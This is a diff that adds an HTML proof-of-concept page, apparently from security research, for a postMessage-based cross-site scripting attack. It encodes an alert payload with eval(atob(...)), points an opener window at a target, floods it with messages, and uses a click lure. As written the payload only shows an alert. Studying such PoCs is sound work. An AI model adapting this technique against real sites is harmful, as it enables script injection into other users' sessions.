@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://unpkg.com/@picocss/pico@1.*/css/pico.min.css">
+<script>
+// This is the js we want our XSS to execute, as a string.
+// The reason we're defining it as a function that is then stringified is
+// simply because it's nice to have syntax highlighing when the payload get
+// more complex.
+const payloadStr = "(" + (_ => {
+  alert(`XSS on ${origin}`);
+}) + ")()";
+
+const payloadStrNoDoubleQuotes = `eval(atob('${btoa(payloadStr)}'))`;
+
+function sendMsg(w) {
+  console.log("[PoC] Sending message...");
+  w.postMessage({}, "*");
+}
+
+function attack(w) {
+  w.location = "https://example.com";
+  setInterval(sendMsg, 500, w);
+}
+
+function attackFromNewWindow() {
+  addEventListener("click", _ => {
+    open(location.href);
+  });
+  addEventListener("DOMContentLoaded", _ => {
+    document.body.innerHTML = "<dialog open><article>Click anywhere to launch the attack</article></dialog>";
+  });
+}
+
+if (opener) attack(opener);
+else attackFromNewWindow();
+</script>
+</head>
+<body></body>
+</html>
